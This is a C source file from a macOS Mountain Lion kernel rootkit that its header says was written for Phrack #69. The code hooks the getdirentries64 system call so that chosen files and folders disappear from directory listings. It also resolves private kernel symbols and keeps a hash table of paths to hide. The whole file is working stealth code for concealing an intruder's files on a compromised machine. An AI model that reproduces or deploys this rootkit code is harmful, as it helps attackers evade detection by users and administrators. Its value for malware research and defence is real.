/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * hide_files.c
 *
 * Code to hide files
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "hide_files.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <sys/vnode.h>
#include <string.h>
#include <sys/attr.h>

#include "proc.h"
#include "sysent.h"
#include "my_data_definitions.h"
#include "kernel_info.h"
#include "function_pointers.h"
#include "path_utils.h"

extern struct kernel_info g_kernel_info;
// hash table of files/folders to hide
struct hidden_files *g_hide_list = NULL;

extern getdirentries64_func_t *real_getdirentries64;

static void show_all_openfiles(struct filedesc *fd);

/*
 * our hijacked getdirentries64
 * it will hide only specific files/dirs
 */
int 
rk_getdirentries64(struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval)
{
#if DEBUG
    char processname[MAXCOMLEN+1];
	// grab process name
	proc_name(p->p_pid, processname, sizeof(processname));
#endif
    int error = real_getdirentries64(p, uap, retval);
        
    // nr of bytes returned is in retval not error
    // if return size was 0 we have nothing to do here
    if (*retval == 0) return error;
    
    size_t count = (size_t)*retval;
    // allocate enough memory to copy the results
    // XXX: is it possible to exhaust this allocation with a folder full of files?
    void *results = _MALLOC(count, M_TEMP, M_WAITOK);
    if (results == NULL) return error;
    // copy the results
    copyin(uap->buf, results, count);
    
    int modified_dirent = 0;
    
    // solve symbols we need
    if (_proc_fdlock == NULL) _proc_fdlock = (void*)solve_kernel_symbol(&g_kernel_info, "_proc_fdlock");
    if (_proc_fdunlock == NULL) _proc_fdunlock = (void*)solve_kernel_symbol(&g_kernel_info, "_proc_fdunlock");
    if (_vnode_lock == NULL) _vnode_lock = (void*)solve_kernel_symbol(&g_kernel_info, "_vnode_lock");
    if (_vnode_unlock == NULL) _vnode_unlock = (void*)solve_kernel_symbol(&g_kernel_info, "_vnode_unlock");
    
    // now we need to match our files to be hidden
    struct direntry *dirent = (struct direntry*)results;
    // iterate thru dirent records and try to match the files/dirs we want to hide
    // the dirent array only countains the name, not the full path
    // the strategy is to initially match the name
    // if it matches then we can proceed, else move to the next entry
    // the next step is to match the path
    // first we retrieve the vnode of folder being listed from fd_ofiles and then we can use vn_getpath()
    // last step is to match the result from vn_getpath() against the path in the structure
    while (dirent->d_reclen > 0 && count > 0)
    {
        count -= dirent->d_reclen;
        modified_dirent = 0;
#if DEBUG
        //        //moony_modify//printf("[DEBUG] %s current file in list: %s\n", processname, (char*)&dirent->d_name);
#endif
        // lookup name in our hash table via the basename
        // NOTE: d_name only has the current file without full path name
        struct hidden_files *tmp = NULL;
        HASH_FIND(hh, g_hide_list, (char*)&dirent->d_name, strlen((char*)&dirent->d_name), tmp);
        // if not found in the hash table we can skip it
        if (tmp == NULL) goto next_record;
        
        // the next step is to get the full path
        // we need to find the current dir
#if DEBUG
        //moony_modify//printf("[DEBUG] Found file to hide: %s!\n", (char*)&dirent->d_name);
#endif
        // lock struct fileproc
        _proc_fdlock(p);
#if DEBUG
        show_all_openfiles(p->p_fd);
#endif
        struct filedesc *main_fd = p->p_fd;
        if (main_fd != NULL)
        {
            int lastfile = main_fd->fd_lastfile;
            // XXX: lastfile has the information we are looking for. always true ???
            // if it's shell expansion lastfile is a tty (as in ls *)
            struct fileproc *last_fp = main_fd->fd_ofiles[lastfile];
            if (last_fp != NULL && last_fp->f_fglob != NULL && last_fp->f_fglob->fg_type == DTYPE_VNODE)
            {
                // fg_data is of type vnode so we can cast it
                struct vnode* last_vnode = (struct vnode*)last_fp->f_fglob->fg_data;
                _vnode_lock(last_vnode);
                // try to match tty due to shell expansion
                char *vname = (char*)last_vnode->v_name;
                if (vname != NULL && strncmp(vname, "ttys", 4) == 0)
                {
                    // find the before last valid fileproc
                    // because when we have a ttys expansion lastfile = 255 but before last is not 254!
                    struct fileproc *fp1 = NULL;
                    int iterator = lastfile-1;
                    for (; (fp1 = main_fd->fd_ofiles[iterator]) == NULL; iterator--);
                    
                    if (fp1->f_fglob != NULL && fp1->f_fglob->fg_type == DTYPE_VNODE)
                    {
                        struct vnode *vn1 = (struct vnode*)(fp1->f_fglob->fg_data);
                        char pathbuf[MAXPATHLEN+1];
                        int pathbuf_len = MAXPATHLEN;
                        int err = vn_getpath(vn1, pathbuf, &pathbuf_len);
                        if (err == 0)
                        {
#if DEBUG
                            //moony_modify//printf("[DEBUG] path from vn_getpath is %s\n", pathbuf);
#endif
                            // match patch against what we want to hide
                            // if full path matches then hide, else continue
                            if (memcmp(tmp->fullpath, pathbuf, strlen(pathbuf)) == 0)
                            {
                                *retval -= dirent->d_reclen;
                                // dirent will be pointing to the next entry since we overwrote it
                                bcopy((char*)dirent + dirent->d_reclen, dirent, (size_t)count);
                                modified_dirent = 1;
                            }

                        }
                        else
                        {
#if DEBUG
                            //moony_modify//printf("[ERROR] vn_getpath error is %d\n", err);
#endif
                        }
                    }
                    _vnode_unlock(last_vnode);
                }
                // normal case without shell expansion
                else
                {
                    // we need to unlock here because match_fullpath will also lock
                    char pathbuf[MAXPATHLEN+1];
                    int pathbuf_len = MAXPATHLEN;
                    int err = vn_getpath(last_vnode, pathbuf, &pathbuf_len);
                    if (err == 0)
                    {
#if DEBUG
                        //moony_modify//printf("[DEBUG] path from vn_getpath is %s\n", pathbuf);
#endif
                        if (memcmp(tmp->fullpath, pathbuf, strlen(pathbuf)) == 0)
                        {
                            *retval -= dirent->d_reclen;
                            // dirent will be pointing to the next entry since we overwrote it
                            bcopy((char*)dirent + dirent->d_reclen, dirent, (size_t)count);
                            modified_dirent = 1;
                        }
                    }
                    else
                    {
#if DEBUG
                        //moony_modify//printf("[ERROR] vn_getpath error is %d\n", err);
#endif
                    }
                    _vnode_unlock(last_vnode);
                }
            }
        }
        // unlock struct fileproc
        _proc_fdunlock(p);
        
next_record:
        // move to next record
        if (count != 0 && modified_dirent == 0)
        {
            dirent = (struct direntry*)((char*)dirent + dirent->d_reclen);
        }
    }
    // modify the buffer to userland
    copyout(results, uap->buf, (size_t)*retval);
    // cleanup memory
    bzero(results, count);
    // free memory
    _FREE(results, M_TEMP);
    // end
    return error;
}

#pragma mark Functions to add and remove entries from files to add hash table

kern_return_t
add_file_to_hide(char *hide)
{
    kern_return_t error = KERN_SUCCESS;
    struct hidden_files *temp = NULL;
    HASH_FIND_STR(g_hide_list, hide, temp);
    if (temp == NULL)
    {
        struct hidden_files *newitem = _MALLOC(sizeof(struct hidden_files), M_TEMP, M_WAITOK);
        if (newitem != NULL)
        {
            newitem->fullpath_len = strlen(hide);
            newitem->fullpath = _MALLOC(newitem->fullpath_len+1, M_TEMP, M_WAITOK);
            if (newitem->fullpath == NULL)
            {
                _FREE(newitem, M_TEMP);
                error = KERN_FAILURE;
            }
            strlcpy(newitem->fullpath, hide, newitem->fullpath_len);
            char *base = basename(hide);
            newitem->basename_len = strlen(base);
            newitem->basename = _MALLOC(newitem->basename_len+1, M_TEMP, M_WAITOK);
            if (newitem->basename == NULL)
            {
                _FREE(newitem->fullpath, M_TEMP);
                _FREE(newitem, M_TEMP);
                error = KERN_FAILURE;
            }
            strlcpy(newitem->basename, base, newitem->basename_len+1);
            HASH_ADD_KEYPTR(hh, g_hide_list, newitem->basename, newitem->basename_len, newitem);
        }
    }
    return error;
}

kern_return_t
del_file_to_hide(char *unhide)
{
    struct hidden_files *current= NULL;
    HASH_FIND_STR(g_hide_list, unhide, current);
    if (current != NULL)
    {
        HASH_DEL(g_hide_list, current);
        _FREE(current->fullpath, M_TEMP);
        _FREE(current->basename, M_TEMP);
        _FREE(current, M_TEMP);
    }
    return KERN_SUCCESS;
}

#pragma mark Auxiliary and debugging functions

/*
 * just a debugging function to display all open files in a given proc structure
 * XXX: struct fileproc lock is done by the caller of this function
 */
static void
show_all_openfiles(struct filedesc *fd)
{
    // solve symbols we need
    if (_vnode_lock == NULL) _vnode_lock = (void*)solve_kernel_symbol(&g_kernel_info, "_vnode_lock");
    if (_vnode_unlock == NULL) _vnode_unlock = (void*)solve_kernel_symbol(&g_kernel_info, "_vnode_unlock");

    if (fd != NULL)
    {
        int lastfile = fd->fd_lastfile;               
        // dump all open files by iterating thru fd_ofiles
        for (int count = 0; count <= lastfile; count++)
        {
            struct fileproc *fp = fd->fd_ofiles[count];
            if (fp != NULL && 
                fp->f_fglob != NULL && 
                fp->f_fglob->fg_type == DTYPE_VNODE)
            {
                // type is vnode so we know fg_data will point to a vnode_t structure
                struct vnode *vn = (struct vnode*)fp->f_fglob->fg_data;
                // lock the vnode
                _vnode_lock(vn);
                if (vn->v_name != NULL)
                {
                    //moony_modify//printf("[DEBUG] [%d] Filename: %s\n", count, vn->v_name);
                }
                _vnode_unlock(vn);
            }
        }
    }
}

